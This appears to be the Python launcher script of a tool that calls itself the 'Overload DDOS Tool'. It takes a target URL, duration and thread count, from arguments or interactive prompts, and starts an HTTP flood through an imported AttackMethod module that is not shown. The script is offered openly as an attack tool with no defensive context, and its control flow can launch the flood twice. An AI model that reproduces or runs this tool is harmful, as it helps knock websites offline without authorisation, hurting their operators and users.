# Created by nuvem and tsk

# Import modules
import os
import sys
import argparse
from colorama import Fore
import ctypes
ctypes.windll.kernel32.SetConsoleTitleW("Overload DDOS Tool by: 7zx and 8fn")

# Get the actual directory
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Failed to import some packages", err)
    sys.exit(1)

# Analyze args
parser = argparse.ArgumentParser(description="Overload HTTP Attack")
parser.add_argument(
    "--target",
    type=str,
    metavar="<URL>",
    help="Target URL",
)
parser.add_argument(
    "--method",
    type=str,
    default="HTTP",
    metavar="<HTTP>",
    help="Attack method",
)
parser.add_argument(
    "--time", type=int, default=1200, metavar="<time>", help="time in seconds"
)
parser.add_argument(
    "--threads", type=int, default=100, metavar="<threads>", help="threads count (1-200)"
)

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target

logo = """
 ▒█████   ██▒   █▓▓█████  ██▀███   ██▓     ▒█████   ▄▄▄      ▓█████▄ 
▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
▒██░  ██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
▒██   ██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
░ ████▓▒░   ▒▀█░  ░▒████▒░██▓ ▒██▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
  ░ ▒ ▒░    ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
░ ░ ░ ▒       ░░     ░     ░░   ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
    ░ ░        ░     ░  ░   ░         ░  ░    ░ ░        ░  ░   ░    
              ░                                               ░     
"""
CRED2 = '\33[91m'

if __name__ == "__main__":
    # Print help
    if not method or not target or not time:
        parser.print_help()
        noob = str(input(f"{Fore.RED}[!] {Fore.MAGENTA}Start Noob Overload? [y/n]: {Fore.RESET}"))
        if noob == 'n':
            sys.exit(1)
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(CRED2 + logo + CRED2)
            print("├───DDOS TOOL LAYER 7")
            time = int(input(f"{Fore.RED}│   ├───TIME:{Fore.RESET}"))
            threads = int(input(f"{Fore.RED}│   └───THREADS:{Fore.RESET}"))
            target = str(input(f"{Fore.RED}│   └───URL:{Fore.RESET}"))
            with AttackMethod(
                duration=time, name=method, threads=threads, target=target
            ) as Flood:
                Flood.Start()


    # Execution of DDOS
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
